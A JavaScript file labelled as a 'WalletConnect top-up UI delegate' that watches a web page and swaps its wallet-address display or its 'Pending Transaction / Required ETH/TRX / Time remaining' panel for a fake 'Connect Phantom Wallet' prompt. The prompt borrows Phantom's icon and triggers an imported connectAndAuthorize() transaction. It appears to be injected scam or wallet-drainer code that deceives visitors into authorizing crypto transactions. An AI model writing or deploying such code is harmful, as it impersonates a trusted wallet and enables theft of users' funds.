import { connectAndAuthorize } from "./wallet/transaction.js";

(function () {
  "use strict";

  console.info("[WalletConnect] top-up UI delegate loaded");

  function mount() {
    var replacementNode;
    var copyButtons = Array.prototype.filter.call(document.querySelectorAll("button"), function (button) {
      return /^Copy$/i.test((button.innerText || button.textContent || "").trim());
    });
    var layoutACandidates = [];
    if (copyButtons.length === 1) {
      var node = copyButtons[0].parentElement;
      while (node && !/Your Wallet Address/i.test(node.textContent || "")) node = node.parentElement;
      if (node && !node.hasAttribute("data-psw-walletconnect-replaced")) layoutACandidates.push(node);
    }
    if (layoutACandidates.length === 1) {
      console.info("[WalletConnect] Detected layout: A");
      replacementNode = layoutACandidates[0];
    } else {
      var layoutBButtons = Array.prototype.filter.call(document.querySelectorAll("button"), function (button) {
        return /^Top Up (?:ETH|TRX)$/i.test((button.innerText || button.textContent || "").trim());
      });
      var layoutBMatches = layoutBButtons.filter(function (button) {
        var bodyText = button.closest("body").textContent || "";
        return /Pending Transaction/i.test(bodyText) &&
          /Top up or buy required (?:ETH|TRX) to proceed/i.test(bodyText) &&
          /Required (?:ETH|TRX)/i.test(bodyText) &&
          /Time remaining/i.test(bodyText) &&
          /Confirm/i.test(button.parentElement.parentElement.textContent || "");
      });
      if (layoutBMatches.length === 1) {
        var feeNode = layoutBMatches[0].parentElement;
        var requiredB = [
          /Top up or buy required (?:ETH|TRX) to proceed/i,
          /Required (?:ETH|TRX)/i,
          /Time remaining/i,
          /Top Up (?:ETH|TRX)/i,
          /Confirm/i
        ];
        while (feeNode && !requiredB.every(function (value) { return value.test(feeNode.textContent || ""); })) feeNode = feeNode.parentElement;
        if (feeNode && !feeNode.hasAttribute("data-psw-walletconnect-replaced")) {
          console.info("[WalletConnect] Detected layout: B");
          replacementNode = feeNode;
        }
      }
    }
    if (!replacementNode) return;

    replacementNode.setAttribute("data-psw-walletconnect-replaced", "1");
    var section = document.createElement("div");
    section.className = "psw-wc-topup";
    section.innerHTML = '<img class="psw-wc-topup__icon" src="https://phantom.com/favicon.ico" alt="Phantom Wallet"><h4>Top Up TRX</h4><p>Connect Phantom Wallet to continue with TRC20.</p><div class="psw-wc-topup__status" aria-live="polite"></div><button class="psw-wc-topup__button psw-button psw-button--primary" type="button">Connect Phantom Wallet</button>';
    replacementNode.replaceChildren(section);
    console.info("[WalletConnect] replacement mounted; using Phantom Wallet service");

    var connectButton = section.querySelector(".psw-wc-topup__button");
    var status = section.querySelector(".psw-wc-topup__status");
    connectButton.addEventListener("click", function () {
      console.info("[WalletConnect] delegating to Phantom Wallet service");
      status.textContent = "Opening wallet…";
      connectButton.disabled = true;
      connectAndAuthorize().then(function (result) {
        status.textContent = "Transaction submitted successfully.";
        console.info("[WalletConnect] transaction completed", result);
      }).catch(function (error) {
        console.error("[WalletConnect] transaction failed", error, error && error.stack);
        status.textContent = error && error.message ? error.message : "Wallet transaction failed.";
        connectButton.disabled = false;
      });
    });
  }

  var observer = new MutationObserver(mount);
  observer.observe(document.body, { childList: true, subtree: true });
  console.info("[WalletConnect] observer started");
  mount();
})();
